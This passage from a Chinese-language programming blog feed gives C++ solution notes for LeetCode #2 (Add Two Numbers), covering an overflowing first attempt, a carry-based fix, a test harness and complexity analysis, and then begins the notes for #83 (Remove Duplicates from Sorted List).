        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/2/question1.png"><br><img src="/img/LeetCode/2/question2.png"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述：這題要求給定兩個非空的linked list來代表兩個非整數數字，兩個數字以反向排序，每一個digit被存在個別的node上，題目要求將兩個數字相加後同樣以反向存成一個linked list並回傳</li><li>舉例：可以看範例1，342 和 465 分別以反向排序儲存，並且相加後的值為 807，最後再反向初存成list，輸出 [7,0,8]</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>最一開始的想法大概花費10分鐘定義好，但實際上較為複雜<br>我的想法是從個別List取得個別數字，相加後，再存成list</p></blockquote><ol><li>宣告變數 a1, a2. sum</li><li>Traverse List1 長度</li><li>檢查 list1 的值，逐項相加，存入變數a1</li><li>Traverse List2 長度</li><li>檢查 list2 的值，逐項相加，存入變數a2</li><li>sum &#x3D; a1 +a2;</li><li>建立新list，反向存入sum 中的值</li><li>回傳 new list head</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1=<span class="number">0</span>, len2=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> val1=<span class="number">0</span>, val2=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; value1, value2;</span><br><span class="line">        ListNode * current = l1;</span><br><span class="line">        ListNode * previous;</span><br><span class="line">        ListNode * head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Traverse through list1, derive the length of l1</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            len1++;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        current = l1;</span><br><span class="line">        <span class="comment">//Derive the value of list1</span></span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            value1.<span class="built_in">push_back</span>(current-&gt;val);</span><br><span class="line">            current = current -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        current = l2;</span><br><span class="line">        <span class="comment">//Traverse through list2, derive the length of l2</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            len2++;</span><br><span class="line">            current = current -&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        current = l2;</span><br><span class="line">        <span class="comment">//Derive the value of list2</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            value2.<span class="built_in">push_back</span>(current-&gt;val);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//value1</span></span><br><span class="line">        <span class="type">int</span> factor = value1.<span class="built_in">size</span>() <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=value1.<span class="built_in">size</span>()<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            val1 += value1[i] * <span class="built_in">pow</span>(<span class="number">10</span>,factor);</span><br><span class="line">            factor--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//value2</span></span><br><span class="line">        factor = value2.<span class="built_in">size</span>() <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=value2.<span class="built_in">size</span>()<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            val2 += value2[i] * <span class="built_in">pow</span>(<span class="number">10</span>,factor);</span><br><span class="line">            factor--;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//sum</span></span><br><span class="line">        sum = val1 + val2;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// head</span></span><br><span class="line">        <span class="keyword">if</span>(sum %<span class="number">10</span> != <span class="number">0</span>)&#123; </span><br><span class="line">        ListNode* newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">        sum = sum /<span class="number">10</span>;</span><br><span class="line">        current = newHead;</span><br><span class="line">        previous  = newHead;</span><br><span class="line">        head = newHead;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 0 tail</span></span><br><span class="line">        ListNode* newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        sum = sum /<span class="number">10</span>;</span><br><span class="line">        current = newHead;</span><br><span class="line">        previous  = newHead;</span><br><span class="line">        head = newHead;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// body</span></span><br><span class="line">        <span class="keyword">while</span> (sum  != <span class="number">0</span>)&#123;</span><br><span class="line">            ListNode* newNode = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            current = newNode;</span><br><span class="line">            previous -&gt; next = newNode;</span><br><span class="line">            previous = newNode;</span><br><span class="line">            sum = sum /<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>想法與剛剛一樣，但在sum 存成list的時候要下很多心思，要開始透過取餘數和除以10的方式來獲取每一個digit，再建立新節點，放入值。<strong>但最重要的問題是，這樣的作法容易發生Overflow</strong></p><p><img src="/img/LeetCode/2/runtime_error.png"></p><p>如果把變數改成 <code>long long</code>  或者 <code>unsigned long long</code> 在提交答案時還是會Overflow</p><p><img src="/img/LeetCode/2/runtime_error2.png"></p><p>因此這題的答案肯定不是要用我們轉成數字用加的</p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum =<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        ListNode *newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode *current = newHead;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>( l1 != <span class="literal">nullptr</span> || l2 != <span class="literal">nullptr</span> )&#123;</span><br><span class="line">            sum = carry;</span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                sum += l1-&gt;val;</span><br><span class="line">                l1 = l1 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                sum += l2-&gt;val;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125; </span><br><span class="line">            carry = sum /<span class="number">10</span>;</span><br><span class="line">            current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            current = current -&gt; next;       </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">                current = current -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newHead-&gt;next;         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>後來的想法改變成：<strong>直接在list中進行相加，而不轉成數字</strong></p><p>需要額外處理的會是進位</p><h3 id="說明-1"><a href="#說明-1" class="headerlink" title="說明"></a>說明</h3><ul><li>首先宣告了一個新的head，但就是dummyHead</li><li>然後宣告 <code>current</code>指標，指向dummyHead</li><li>當 <code>l1</code> 或 <code>l2</code> 尚未走到最後節點時，會持續進行相加和計算進位</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l1 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    sum += l1-&gt;val;</span><br><span class="line">    l1 = l1 -&gt; next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    sum += l2-&gt;val;</span><br><span class="line">    l2 = l2-&gt;next;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li>兩個 list 個別處理，將節點的值加進 <code>sum</code> 中，並將個別list 移到下一個節點</li><li>接著計算進位進位會是 <code>carry = sum /10</code></li><li>接著就是在 dummyHead 後面新增一個新節點，節點值會是 <code>sum % 10</code> 也就是取sum的個位數數字</li><li>更新 <code>current</code> 指標</li><li>最後判斷如果到最後 <code>carry &gt; 0</code> 新增一個進位用的節點，並更新指標，最後回傳dummyHead的下一個節點位址</li></ul><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x, ListNode *next) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(next) &#123;&#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">ListNode</span> *current;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(ListNode *first)</span></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ListNode</span> *ptr = first;</span><br><span class="line">    <span class="keyword">if</span>(first != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cout &lt;&lt; ptr-&gt;val &lt;&lt; <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">            ptr = ptr -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty list&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;NULL&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> sum =<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">    ListNode *newHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    ListNode *current = newHead;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( l1 != <span class="literal">nullptr</span> || l2 != <span class="literal">nullptr</span> )&#123;</span><br><span class="line">        sum = carry;</span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            sum += l1-&gt;val;</span><br><span class="line">            l1 = l1 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            sum += l2-&gt;val;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125; </span><br><span class="line">        carry = sum /<span class="number">10</span>;</span><br><span class="line">        current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">        current = current -&gt; next;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            current-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">            current = current -&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newHead-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//Create list 1</span></span><br><span class="line">    <span class="comment">// ListNode node1_3(9);</span></span><br><span class="line">    <span class="function">ListNode <span class="title">node1_2</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">node1_1</span><span class="params">(<span class="number">9</span>, &amp;node1_2)</span></span>;</span><br><span class="line">    <span class="comment">//Print List1</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;list1:&quot;</span>;</span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node1_1);</span><br><span class="line">    <span class="comment">//Create list 2</span></span><br><span class="line">    <span class="comment">//ListNode node2_2(9);</span></span><br><span class="line">    <span class="function">ListNode <span class="title">node2_1</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">    <span class="comment">//Print List2</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;list2:&quot;</span>;</span><br><span class="line">    <span class="built_in">PrintList</span>(&amp;node2_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Output</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Reverse output:&quot;</span>;</span><br><span class="line">    <span class="built_in">PrintList</span>(<span class="built_in">addTwoNumbers</span>(&amp;node1_1, &amp;node2_1));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/2/results.png"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>這個函數主要由一個 while 迴圈組成，迴圈會運行直到 <code>l1</code> 和 <code>l2</code> 都為 <code>nullptr</code>，在每次迭代中，我們至多只訪問 <code>l1</code> 和 <code>l2</code> 的每個節點一次。因此，時間複雜度取決於 <code>l1</code> 和 <code>l2</code> 的長度，假設 <code>l1</code> 和 <code>l2</code> 的長度分別為 $N$, $M$，則時間複雜度為 $O(max(N,M))$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>除了輸入的list外，我們創建了一個新的list來存儲結果。新list的長度將等於較長的輸入鏈表的長度加上可能的一個額外節點（存儲最後的進位）。<br>因此，空間複雜度也是 $O(max(n,m))$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從排序鏈結串列刪除重複 | Easy | LeetCode#83. Remove Duplicates from Sorted List</title>
      <link href="/posts/c8064a2b.html"/>
      <url>/posts/c8064a2b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/83/question1.png"><br><img src="/img/LeetCode/83/question2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個排序鍊結串列的 <code>head</code>, 刪除所有重複節點，每個節點元素僅能出現一次，回傳排列串列</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><blockquote><p>這是第一次改用 C++ 寫 Linked List 題目，但由於題目是 single linked list，因此沒能夠用到透過 double linked list 實作的 <strong>std:list</strong> STL Library，有點小可惜，所以思路上還是用到了慣用的 C</p></blockquote><p>時間紀錄:</p><ul><li>想解決辦法: 1min</li><li>實際撰寫程式碼: 15 minutes</li></ul><blockquote><p>大概 Run 兩次，第一次沒有考慮到結尾 Null Pointer 的狀況</p></blockquote><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/83/algo.png"></p><ol><li>定義好兩個指標，分別指到前一個節點跟當前節點</li><li>遍歷整個list</li><li>每次都檢查當前節點值與前一個節點值是否一樣，結束後更新指標值</li><li>回傳head</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ListNode * ansHead = head;</span><br><span class="line">        ListNode * current = head;</span><br><span class="line">        ListNode *previous  =<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current == head)&#123; <span class="comment">// head</span></span><br><span class="line">                previous = current;</span><br><span class="line">                current = current-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; <span class="comment">// the following nodes</span></span><br><span class="line">                <span class="keyword">while</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next != <span class="literal">NULL</span> )&#123;</span><br><span class="line">                    ListNode* temp = current-&gt;next; </span><br><span class="line">                    current = current-&gt;next;</span><br><span class="line">                    previous -&gt; next = current;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    ListNode* temp = current-&gt;next; </span><br><span class="line">                    current = current-&gt;next;</span><br><span class="line">                    previous -&gt; next = current;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    current = current-&gt; next;</span><br><span class="line">                    previous = previous-&gt;next;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ansHead;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>首先是初始化，<code>ansHead</code> 用來保存結果list的head，<code>current</code> 用來遍歷list，<code>previous</code> 用來記錄當前節點的前一個節點。接著當 <code>current!= NULL</code> 的時候，會去循環遍歷節點，這裡將頭節點以及其他節點分開處理，因為我希望如果有重複，刪除的都是第2個以後的節點，因此走到頭節點僅需要更新指標就好，走到其他節點時，就需要檢查前一個節點跟現在節點是否一樣 (<code>previous-&gt;val == current-&gt;val &amp;&amp; current-&gt;next != NULL</code>) 如果一樣，要做的事情有三件:</p><ol><li>建立臨時指標，用來指向 <code>current</code> 的下一個節點</li><li>將 <code>current</code> 指向其下一個節點</li><li>更新 <code>previous-&gt;next</code> 為 <code>current</code></li></ol><p><img src="/img/LeetCode/83/algo2.png"></p><p>如果有多個重複節點，就可以在 while 迴圈內一併刪除</p><p>如果走到最後一個節點，一樣建立臨時節點只到NULL，更新<code>current</code>成 NULL，並且更新 <code>previous</code> 指標。</p><p>最後回傳 <code>ansHead</code></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 